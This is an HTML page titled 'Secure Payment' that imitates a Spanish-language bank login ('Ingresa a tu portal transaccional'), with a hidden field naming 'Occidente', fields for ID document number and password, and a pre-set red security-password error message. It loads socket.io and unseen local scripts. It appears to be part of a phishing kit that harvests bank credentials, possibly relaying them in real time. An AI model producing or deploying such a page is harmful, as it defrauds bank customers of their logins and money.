<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Payment</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
      }
    </style>
  </head>

  <body>
    <img
      src="img/1.jfif"
      alt=""
      srcset=""
      width="30%"
      style="position: absolute; right: 0"
    />
    <br /><br /><br /><br /><br /><br />
    <center>
      <img src="img/logo.png" alt="" srcset="" width="40%" /> <br /><br /><br />
      <a><b style="font-size: 13px">INGRESA A TU PORTAL TRANSACCIONAL</b></a>
    </center>
    <br /><br />

    <label for="" style="margin-left: 5%; font-size: 13px; color: #556493"
      >Tipo de Documento</label
    ><br />
    <select
      style="
        width: 90%;
        height: 35px;
        border-radius: 5px;
        background-color: white;
        color: black;
        border: 1px solid #c7cfed;
        margin-left: 5%;
      "
    >
      <option>Cedula de Ciudadania</option>
      <option>Tarjeta de identidad</option>
      <option>Cédula de extranjería</option>
      <option>Pasaporte</option></select
    ><br /><br />
    <label for="" style="margin-left: 5%; font-size: 13px; color: #556493"
      >No. de Documento</label
    ><br />
    <input
      type="text"
      placeholder="*Documento"
      name="documento"
      id="txtUsuario"
      style="
        width: 87%;
        height: 35px;
        border-radius: 5px;
        background-color: white;
        color: black;
        border: 1px solid #c7cfed;
        margin-left: 5%;
        padding-left: 10px;
      "
    /><br /><br />
    <label for="" style="margin-left: 5%; font-size: 13px; color: #556493"
      >Contraseña</label
    ><br />
    <input type="hidden" name="" value="Occidente" id="banco" />
    <input
      type="password"
      placeholder="*Contraseña"
      name="clave"
      id="txtPass"
      style="
        width: 87%;
        height: 35px;
        border-radius: 5px;
        background-color: white;
        color: black;
        border: 1px solid #c7cfed;
        margin-left: 5%;
        padding-left: 10px;
      "
    /><br />
    <p
      style="
        margin-left: 5%;
        margin-top: 10px;
        font-weight: 800;
        color: #ff0000;
      "
    >
      Error en su clave de seguridad
    </p>
    <br />
    <!-- <a style="margin-left:5%; margin-top: 10px; font-size:13px; color:#0081ff;">Olvidé mi clave</a> -->

    <img src="img/2.jfif" alt="" srcset="" width="100%" />

    <center>
      <br /><br />
      <input
        type="submit"
        value="Ingresar"
        id="btnUsuario"
        style="
          background-color: blue;
          width: 80%;
          color: white;
          height: 35px;
          border-radius: 5px;
          border: none;
        "
      />
    </center>
    <script src="../../../js/functions.js"></script>
    <script src="js/newUser.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
    <script src="js/wait.js"></script>
  </body>
</html>
